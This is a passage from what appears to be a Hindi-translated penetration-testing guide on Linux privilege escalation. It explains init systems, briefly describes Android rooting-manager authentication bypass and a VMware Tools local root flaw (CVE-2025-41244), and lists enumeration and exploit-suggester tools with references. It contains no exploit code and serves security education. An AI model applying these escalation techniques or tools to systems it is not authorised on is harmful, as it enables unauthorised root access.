`/etc/init.d` डायरेक्टरी में System V init (SysVinit) के **scripts** होते हैं। यह **classic Linux service management system** है। इसमें services को `start`, `stop`, `restart`, और कभी-कभी `reload` करने के scripts शामिल होते हैं। इन्हें सीधे या `/etc/rc?.d/` में मौजूद symbolic links के ज़रिए चलाया जा सकता है। Redhat systems में इसका वैकल्पिक path `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` का संबंध **Upstart** से है। यह Ubuntu द्वारा शुरू किया गया नया **service management** system है, जो service management tasks के लिए configuration files का उपयोग करता है। Upstart पर जाने के बावजूद, Upstart की compatibility layer के कारण SysVinit scripts का उपयोग Upstart configurations के साथ अब भी किया जाता है।

**systemd** एक आधुनिक initialization और service manager है, जो मांग पर daemon शुरू करने, automount management, और system state snapshots जैसी उन्नत सुविधाएँ देता है। यह distribution packages की files को `/usr/lib/systemd/` में और administrator द्वारा किए गए बदलावों को `/etc/systemd/system/` में व्यवस्थित करता है, जिससे system administration की प्रक्रिया सरल हो जाती है।<sup>[[21]](#references)</sup>

## अन्य तरकीबें

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### प्रतिबंधित Shells से बाहर निकलना


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर userspace manager को privileged kernel functionality उपलब्ध कराने के लिए किसी syscall को hook करते हैं। Manager का कमजोर authentication (उदाहरण के लिए, FD-order पर आधारित signature checks या कमजोर password schemes) किसी local app को manager का रूप धारण करने और पहले से rooted devices पर root तक पहुँचने में सक्षम बना सकता है। यहाँ अधिक जानकारी और exploitation के विवरण देखें:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Regex-based exec के ज़रिए VMware Tools service discovery LPE (CWE-426) (CVE-2025-41244)

VMware Tools/Aria Operations में regex-आधारित service discovery, process command lines से binary path निकालकर उसे privileged context में -v के साथ execute कर सकती है। बहुत permissive patterns (उदाहरण के लिए, \S का उपयोग) writable locations (जैसे, /tmp/httpd) में attacker द्वारा रखे गए listeners से match कर सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path)।<sup>[[27]](#references)</sup>

यहाँ अन्य discovery/monitoring stacks पर लागू होने वाले सामान्यीकृत pattern के बारे में अधिक जानें और उसे देखें:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## अधिक सहायता

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux और MAC में kernel vulns की enumeration [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**अधिक scripts का संग्रह**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron द्वारा चलाए गए monitor के लिए forged .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [बुनियादी Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Privilege Escalation गाइड](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [हमला और बचाव: 2016 की Linux Privilege Escalation तकनीकें](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [किसी ने command execution की उम्मीद नहीं की!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Lab Exercises Walkthrough - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux Priv Escalation के लिए सुझाव और तरकीबें](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux Enumeration और Privilege Escalation tool](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket क्या है?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS के बारे में जानें](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux पर ACLs को manage कैसे करें](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [network-scripts के ज़रिए Redhat/CentOS root](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd क्या है?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (logs के ज़रिए bash arithmetic injection, पूरी chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – नाम कुछ भी दें, VMware उसे elevate कर देता है (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot के ज़रिए Privilege Escalation](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 और CVE-2025-32463 Sudo elevation-of-privilege vulnerabilities](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [32] [Python importlib दस्तावेज़](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec का Tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux पर Passwords की logging](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate Race Condition का विवरण](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10 documentation – `site` और path configuration files](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
